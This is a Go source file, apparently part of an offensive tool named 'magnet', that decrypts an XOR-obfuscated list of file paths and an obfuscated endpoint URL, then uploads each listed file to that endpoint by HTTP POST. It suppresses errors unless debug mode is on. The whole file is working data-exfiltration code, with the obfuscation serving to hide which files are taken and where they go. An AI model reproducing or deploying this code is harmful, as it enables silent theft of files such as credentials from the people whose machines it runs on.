package magnet

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	encryption "github.com/ariary/go-utils/pkg/encrypt"
)

// Magnet: wrapper functions to decrypt file list and endpoint and send all the files to the endpoint using HTTP
func Magnet(fileList string, endpoint string, key string, debug bool) {
	//unflat file list + decrypt files
	files := UnfreezeList(fileList, key, debug)

	// decrypt endpoint
	cEndpoint := UnfreezeEndpoint(endpoint, key, debug)

	// send files
	SendFiles(files, cEndpoint, debug)
}

// Sendfiles: send all files of a list using HTTP multipart-form data request to a specified endpoint
func SendFiles(fileList []string, cEndpoint string, debug bool) {
	client := &http.Client{}
	for i := 0; i < len(fileList); i++ {
		err := SendFile(client, cEndpoint, fileList[i])
		if err != nil && debug {
			fmt.Println(fileList[i])
			fmt.Println("error:", err)
		}
	}
}

// SendFile: use HTTP multipart form data request to upload a specific file on specified endpoint
func SendFile(client *http.Client, endpoint string, filename string) (codeerr error) {
	// file exists?
	data, err := os.Open(os.ExpandEnv(filename))
	if err != nil {
		//surely file does not exist -> stop
		return err
	}

	// send file
	values := map[string]io.Reader{
		"file": data,
	}

	err = Upload(client, endpoint, values)
	if err != nil {
		return err
	}

	return err
}

// Upload: construct upload request and sumbit it
func Upload(client *http.Client, url string, values map[string]io.Reader) (err error) {
	// Prepare a form that you will submit to that URL.
	var b bytes.Buffer
	w := multipart.NewWriter(&b)
	for key, r := range values {
		var fw io.Writer
		if x, ok := r.(io.Closer); ok {
			defer x.Close()
		}
		// Add file
		if x, ok := r.(*os.File); ok {

			if fw, err = w.CreateFormFile(key, x.Name()+"-"+strconv.Itoa(time.Now().Nanosecond())); err != nil { //weird name to avoid collision
				return err
			}
		} else {
			// Add other fields
			if fw, err = w.CreateFormField(key); err != nil {
				return err
			}
		}
		if _, err = io.Copy(fw, r); err != nil {
			return err
		}

	}

	w.Close()

	req, err := http.NewRequest("POST", url, &b)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", w.FormDataContentType())

	// Submit the request
	res, err := client.Do(req)
	if err != nil {
		return err
	}

	// Check the response
	if res.StatusCode != http.StatusOK {
		err = fmt.Errorf("bad status: %s", res.Status)
	}
	return err
}

// UnfreezeList: unflat a file list and decrypt them using xor function. if debug mode is enabled, print some information
func UnfreezeList(files string, key string, debug bool) (fileList []string) {
	encFileList := strings.Split(files, "\n")
	fileList = make([]string, len(encFileList))
	if debug {
		fmt.Println("files:")
	}
	for i := 0; i < len(encFileList); i++ {
		filename, err := encryption.Decode(encFileList[i])
		if err != nil && debug {
			fmt.Println(err)
		}
		fileList[i] = encryption.Xor(string(filename), key)
		if debug {
			fmt.Println(fileList[i])
		}
	}
	return fileList
}

// UnfreezeEndpoint: Decrypt endpoint with xor function
func UnfreezeEndpoint(endpoint string, key string, debug bool) (cEndpoint string) {
	decEndpoint, err := encryption.Decode(endpoint)
	if err != nil && debug {
		fmt.Println(err)
	}
	cEndpoint = encryption.Xor(string(decEndpoint), key)
	if debug {
		fmt.Println("endpoint:", cEndpoint)
	}
	return cEndpoint
}
